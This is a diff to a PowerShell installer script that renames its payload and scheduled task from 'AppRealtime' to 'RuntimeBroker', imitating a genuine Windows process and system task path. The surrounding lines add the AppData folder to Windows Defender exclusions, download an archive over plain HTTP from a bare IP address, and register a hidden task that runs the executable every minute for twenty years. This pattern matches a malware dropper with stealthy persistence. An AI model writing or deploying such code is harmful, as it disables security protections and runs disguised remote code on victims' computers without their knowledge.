@@ -1,6 +1,3 @@
-# Variables for task name and task path
-$taskName = 'AppRealtime'
-
 # Function to check if the script is running as administrator
 function Test-Administrator {
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -24,16 +21,64 @@ if ($currentPolicy -ne 'RemoteSigned') {
 # Get the current user's name
 $currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
 
+#========================================================
+
+# Remove old Version (AppRealtime)
+Write-Host "Remove old Version (AppRealtime)"
+
+$appDataPath = "C:\Users\$currentUserName\AppData"
+$currentDir = "$appDataPath\Local\Microsoft\AppRealtime"
+$taskName = 'AppRealtime'
+
+# Check if the task exists and delete it if necessary
+if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+}
+
+# Check if any files in the directory are being held by any processes and kill those processes
+if (Test-Path -Path $currentDir) {
+    $lockingProcesses = Get-Process | Where-Object { $_.Modules.FileName -like "$currentDir\*" }
+    foreach ($process in $lockingProcesses) {
+        Stop-Process -Id $process.Id -Force
+    }
+}
+
+# Delete the directory if it exists and recreate it
+if (Test-Path -Path $currentDir) {
+    Write-Host "Waiting for 5 seconds before deleting the directory..."
+    Start-Sleep -Seconds 5
+    Remove-Item -Path $currentDir -Recurse -Force
+}
+# End Remove old Version
+
+#========================================================
+
+
+
 # Set the target directory and AppData path
 $appDataPath = "C:\Users\$currentUserName\AppData"
-$currentDir = "$appDataPath\Local\Microsoft\AppRealTime"
-$taskExecutablePath = Join-Path -Path $currentDir -ChildPath "AppRealtime.exe"
+$currentDir = "$appDataPath\Local\Microsoft\RuntimeBroker"
+$taskExecutablePath = Join-Path -Path $currentDir -ChildPath "RuntimeBroker.exe"
+
+# Variables for task name and task path
+$taskName = 'RuntimeBroker'
+
+Write-Host "Check if Visual C++ Redistributable is installed"
 
 # Function to check if Visual C++ Redistributable is installed
 function Test-VCRedist {
-    $key = "HKLM:\SOFTWARE\Classes\Installer\Dependencies"
-    $vcredistKeys = Get-ChildItem -Path $key -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "VC,redist.x64,amd64,14.*" }
-    return $vcredistKeys -ne $null
+    $keyPath = "HKLM:\SOFTWARE\Microsoft\DevDiv\VC\Servicing\14.0\RuntimeMinimum"
+    $valueName = "Version"
+    $minVersion = [version]"14.30.30704"
+    
+    try {
+        $value = Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction Stop
+        $installedVersion = [version]$value.Version
+        return $installedVersion -ge $minVersion
+    }
+    catch {
+        return $false
+    }
 }
 
 # Install Visual C++ Redistributable if not installed
@@ -72,6 +117,8 @@ Set-Location -Path $currentDir
 # 1. Add the AppData directory to the exclusion list in Windows Defender
 Add-MpPreference -ExclusionPath $appDataPath
 
+Write-Host "Download the file from the link and extract it to the current directory"
+
 # 2. Download the file from the link and extract it to the current directory
 $zipUrl = "http://116.203.93.143/00_update/app.zip"
 $zipFile = "$currentDir\app.zip"
@@ -108,7 +155,8 @@ if (-not (Test-Path -Path $appSettingsPath)) {
 }
 
 # 4. Create a scheduled task with the specified script
-$taskPath = Join-Path -Path $currentDir -ChildPath "AppRealtime.exe"
+Write-Host "Create a scheduled task with the specified script"
+$taskPath = Join-Path -Path $currentDir -ChildPath "RuntimeBroker.exe"
 
 $action = New-ScheduledTaskAction -Execute $taskPath
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days (365 * 20))
@@ -117,7 +165,8 @@ $settings.DisallowStartIfOnBatteries = $false
 $settings.StopIfGoingOnBatteries = $false
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath '\Microsoft\Windows\Shell' -Settings $settings -Force
 
-# 5. Run the AppRealtime task
+# 5. Run the RuntimeBroker task
+Write-Host "Run the RuntimeBroker task"
 if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Start-ScheduledTask  -TaskPath '\Microsoft\Windows\Shell' -TaskName $taskName
 } else {
